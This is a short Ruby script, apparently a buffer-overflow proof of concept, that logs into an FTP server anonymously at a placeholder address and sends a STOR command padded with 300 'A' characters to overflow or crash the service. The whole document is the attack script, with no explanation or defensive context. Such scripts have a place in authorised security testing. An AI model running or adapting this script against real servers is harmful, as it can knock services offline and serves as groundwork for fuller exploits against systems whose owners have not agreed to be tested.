#!/bin/ruby

require 'socket'

buffer = "A" * 300

host = 'XXX.XXX.XXX.XXX'
port = 21
s = TCPSocket.open(host, port)
s.recv(1024)
s.send("USER anonymous\r\n", 0)
s.recv(1024)
s.send("PASS anonymous\r\n", 0)
s.recv(1024)
s.send("STOR" + buffer + "\r\n", 0)
s.recv(1024)
s.send("QUIT\r\n", 0)
s.close
print buffer
